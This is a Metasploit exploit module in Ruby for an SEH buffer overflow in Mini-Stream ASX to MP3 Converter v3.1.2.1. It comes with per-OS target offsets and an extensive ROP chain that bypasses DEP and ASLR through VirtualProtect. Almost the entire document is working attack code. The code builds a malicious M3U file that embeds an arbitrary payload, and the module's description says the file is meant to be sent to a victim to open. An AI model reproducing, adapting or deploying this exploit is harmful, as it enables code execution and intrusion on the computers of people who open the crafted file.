ASX to MP3 Converter v3.1.2.1 SEH (Multiple OS, DEP and ASLR Bypass)
====================================================================


# Exploit Title:     ASX to MP3 Converter v3.1.2.1 SEH Exploit (Multiple OS, DEP and ASLR Bypass)
# Date:              July 13, 2010
# Author:            Node
# Software Link:     http://www.mini-stream.net/downloads/ASXtoMP3Converter.exe
# Version:           Mini-Stream Software ASX to MP3 Converter v3.1.2.1.2010.03.30 Evaluation
# Tested on:         Windows Vista Ultimate SP1 Eng
#                    Windows Vista Ultimate SP2 Eng
#                    Windows XP Pro SP3 Eng
#                    Windows XP Pro SP2 Swe
#                    Windows XP Pro SP3 Swe
#                    Windows XP Home SP3 Swe
# CVE :
# Notes:             This is a proof of concept that it is possible to write ROP exploits
#                    that are portable to different operating systems. This exploit is
#                    using the following variables:
#
#                    1. "Offset":    The offset to the SEH overwrite
#                    2. "Offset2":   The offset before the ROP code starts in the buffer
#                    3. "K32Offset": The offset to the kernel32 pointer on the stack
#                    4. "VPOffset":  The offset to VirtualProtect() from the grabbed
#                                    kernel32 address
#                    5. "ASLR":      Activates or deactivates the ASLR bypassing ROP code
#
#                    The K32Offset and VPOffset are negged hex-numbers, to evade the
#                    null-byte problem. In the first target, K32Offset is "0xfffebcac"
#                    which gets converted in the ROP code to 0x00014354 (82772), which is
#                    how much the saved ESP address needs to be subtracted, to point to
#                    the kernel32 address. VPOffset is how much the Kernel32 address
#                    needs to be subtracted, to point to the VirtualProtect() function.
#                    If "ASLR" is false, "VPOffset" will be treated as the direct,
#                    non-negged address to VirtualProtect() in Kernel32.dll.
# Code:
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Mini-Stream Software ASX to MP3 Converter v3.1.2.1 SEH Buffer Overflow.&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a SEH-based buffer overflow in ASX to MP3 Converter
                    v.3.1.2.1. An attacker must send the file to victim, and the victim must open
                    the specially crafted M3U file. This exploit is written with ROP gadgets from
                    MSA2Mfilter03.dll and bypasses DEP on all systems including ASLR on Vista.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;Node&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 99999 $&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;ASX to MP3 Converter v3.1.2.1 on Windows Vista Ultimate SP1 Eng x86&#039;,    
                        {&#039;Offset&#039; => 43511,
                        &#039;Offset2&#039; =>  16339,
                        &#039;K32Offset&#039; => 0xfffebcac,
                        &#039;VPOffset&#039; => 0xfffe4e9c,
                        &#039;ASLR&#039; => true } ],
                    [ &#039;ASX to MP3 Converter v3.1.2.1 on Windows Vista Ultimate SP2 Eng x86&#039;,    
                        {&#039;Offset&#039; => 43511,
                        &#039;Offset2&#039; =>  16339,
                        &#039;K32Offset&#039; => 0xfffebcac,
                        &#039;VPOffset&#039; => 0xfffe5bf0,
                        &#039;ASLR&#039; => true } ],
                    [ &#039;ASX to MP3 Converter v3.1.2.1 on Windows XP Pro SP3 Eng x86&#039;,   
                        {&#039;Offset&#039; => 43484,
                        &#039;Offset2&#039; =>  16312,
                        &#039;VPOffset&#039; => 0x7c801ad4,
                        &#039;ASLR&#039; => false } ],
                    [ &#039;ASX to MP3 Converter v3.1.2.1 on Windows XP Pro SP2 Swe x86&#039;,   
                        {&#039;Offset&#039; => 43476,
                        &#039;Offset2&#039; =>  16304,
                        &#039;VPOffset&#039; => 0x7c801ad0,
                        &#039;ASLR&#039; => false } ],
                    [ &#039;ASX to MP3 Converter v3.1.2.1 on Windows XP Pro SP3 Swe x86&#039;,   
                        {&#039;Offset&#039; => 43491,
                        &#039;Offset2&#039; =>  16319,
                        &#039;VPOffset&#039; => 0x7c801ad4,
                        &#039;ASLR&#039; => false } ],
                    [ &#039;ASX to MP3 Converter v3.1.2.1 on Windows XP Home SP3 Swe x86&#039;,  
                        {&#039;Offset&#039; => 43476,
                        &#039;Offset2&#039; =>  16304,
                        &#039;VPOffset&#039; => 0x7c801ad4,
                        &#039;ASLR&#039; => false } ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;asx2mp3.m3u&#039;]),
            ], self.class)
    end
 
    def exploit
 
        rop = [0x1002F7B7].pack(&#039;V&#039;)  # PUSH ESP # AND AL,0C # NEG EDX # NEG EAX # SBB EDX,0 # POP EBX # RETN 10
        rop << [0x10023315].pack(&#039;V&#039;) # ADD ESP,20 # RETN 
        rop << "1111" # VirtualProtect() placeholder
        rop << "2222" #return address placeholder
        rop << "3333" #lpAddress placeholder
        rop << "4444" #dwsize placeholder
        rop << "5555" #flNewProtect placeholder
        rop << [0x10066005].pack(&#039;V&#039;) # lpflOldProtect writable address
        rop << "A" * 8
        rop << "A" * 16 # because of RETN 10
        rop << [0x1002991C].pack(&#039;V&#039;) # XOR EDX,EDX # RETN
        rop << [0x10029F3E].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
        rop << "A" * 4
        rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
        rop << "A" * 16
         
         
        if target[&#039;ASLR&#039;] == true
            rop << [0x1002A649].pack(&#039;V&#039;)  # POP EAX # RETN
            rop << [target[&#039;K32Offset&#039;]].pack(&#039;V&#039;)
            rop << [0x1005B5DB].pack(&#039;V&#039;) # NEG EAX # RETN
            rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
            rop << "A" * 8
            rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
            rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
            rop << [0x100130C4].pack(&#039;V&#039;)  # MOV ECX,DWORD PTR DS:[EAX] # ADD BYTE PTR DS:[EAX],AL # POP EBP # POP EBX # RETN
            rop << "A" * 8
            rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
            rop << [0x1002C86A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
            rop << [0x10027F59].pack(&#039;V&#039;)  # MOV EAX,DWORD PTR DS:[EAX] # RETN
            rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
            rop << "A" * 8
        end
 
        rop << [0x100115AA].pack(&#039;V&#039;)  # POP EBX # RETN
        rop << [0xffffffff].pack(&#039;V&#039;)
        rop << [0x10014548].pack(&#039;V&#039;)  # XOR EAX,EAX # RETN
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x1002D327].pack(&#039;V&#039;)  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN
        rop << [0x10029F3E].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
        rop << "A" * 4
        rop << [0x1002A649].pack(&#039;V&#039;)  # POP EAX # RETN
        rop << "A" * 16
 
        rop << [target[&#039;VPOffset&#039;]].pack(&#039;V&#039;)
 
        if target[&#039;ASLR&#039;] == true
            rop << [0x1005B5DB].pack(&#039;V&#039;) # NEG EAX # RETN
            rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
            rop << "A" * 8
            rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
            rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
            rop << [0x100130C4].pack(&#039;V&#039;)  # MOV ECX,DWORD PTR DS:[EAX] # ADD BYTE PTR DS:[EAX],AL # POP EBP #POP EBX # RETN
            rop << "A" * 8
            rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
            rop << [0x10027F59].pack(&#039;V&#039;)  # MOV EAX,DWORD PTR DS:[EAX] # RETN
            rop << [0x1002C86A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        end
  
        rop << [0x10019AA7].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX],EAX # POP EDI # XOR EAX,EAX # POP EBP # ADD ESP,40        # RETN
        rop << "A" * 8
        rop << "A" * 64
        rop << [0x1002A649].pack(&#039;V&#039;)  # POP EAX # RETN
        rop << [0xffff95c8].pack(&#039;V&#039;) # negged shellcode offset
        rop << [0x1005B5DB].pack(&#039;V&#039;) # NEG EAX # RETN
        rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
        rop << "A" * 8
        rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x100130C4].pack(&#039;V&#039;)  # MOV ECX,DWORD PTR DS:[EAX] # ADD BYTE PTR DS:[EAX],AL # POP EBP # POP EBX # RETN
        rop << "A" * 8
        rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
        rop << [0x1001451E].pack(&#039;V&#039;)  # ADD EAX,ECX # RETN
        rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
        rop << "A" * 8
        rop << [0x100115AA].pack(&#039;V&#039;)  # POP EBX # RETN
        rop << [0xffffffff].pack(&#039;V&#039;)
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x1002D327].pack(&#039;V&#039;)  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN
        rop << [0x10029F3E].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
        rop << "A" * 4
        rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
        rop << "A" * 16  
        rop << [0x10027F59].pack(&#039;V&#039;)  # MOV EAX,DWORD PTR DS:[EAX] # RETN
        rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
        rop << "A" * 8
        rop << [0x100115AA].pack(&#039;V&#039;)  # POP EBX # RETN
        rop << [0xffffffff].pack(&#039;V&#039;)
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x1002D327].pack(&#039;V&#039;)  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN
        rop << [0x10029F3E].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
        rop << "A" * 4
        rop << [0x1002A649].pack(&#039;V&#039;)  # POP EAX # RETN
        rop << "A" * 16
        rop << [0xfffffc18].pack(&#039;V&#039;) # 0x3e8(1000].pack(&#039;V&#039;) negged
        rop << [0x1005B5DB].pack(&#039;V&#039;) # NEG EAX # RETN
        rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
        rop << "A" * 8
        rop << [0x100115AA].pack(&#039;V&#039;)  # POP EBX # RETN
        rop << [0xffffffff].pack(&#039;V&#039;)
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x1002D327].pack(&#039;V&#039;)  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN
        rop << [0x10029F3E].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
        rop << "A" * 4
        rop << [0x1002A649].pack(&#039;V&#039;)  # POP EAX # RETN
        rop << "A" * 16
        rop << [0xffffffc0].pack(&#039;V&#039;) # 0x40 negged
        rop << [0x1005B5DB].pack(&#039;V&#039;) # NEG EAX # RETN
        rop << [0x100163CA].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[EDX+4],EAX # XOR EAX,EAX # ADD ESP,8 # RETN
        rop << "A" * 8
        rop << [0x100115AA].pack(&#039;V&#039;)  # POP EBX # RETN
        rop << [0xffffffff].pack(&#039;V&#039;)
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x100192DC].pack(&#039;V&#039;)  # ADD EAX,4 # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x10016C87].pack(&#039;V&#039;)  # INC EAX # RETN
        rop << [0x1005B5DB].pack(&#039;V&#039;) # NEG EAX # RETN
        rop << [0x1002D327].pack(&#039;V&#039;)  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN
        rop << [0x10029F3E].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
        rop << "A" * 4
        rop << [0x1002FA6A].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
        rop << "A" * 16
        rop << [0x1002FE81].pack(&#039;V&#039;)  # XCHG EAX,ESP # RETN
 
        junk = rand_text_alpha_upper(target[&#039;Offset2&#039;]) #needed because of ADD ESP,4404 # RETN
        junktoseh = rand_text_alpha_upper(target[&#039;Offset&#039;] - junk.length - rop.length)
        seh = [0x100177EA].pack(&#039;V&#039;) #ADD ESP,4404 # RETN
        nops = "\x90" * 24
        shellspace = rand_text_alpha_upper(1000 - payload.encoded.length)
        m3ufile = junk + rop + junktoseh + seh + nops + payload.encoded + shellspace
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(m3ufile)
 
    end
 
end



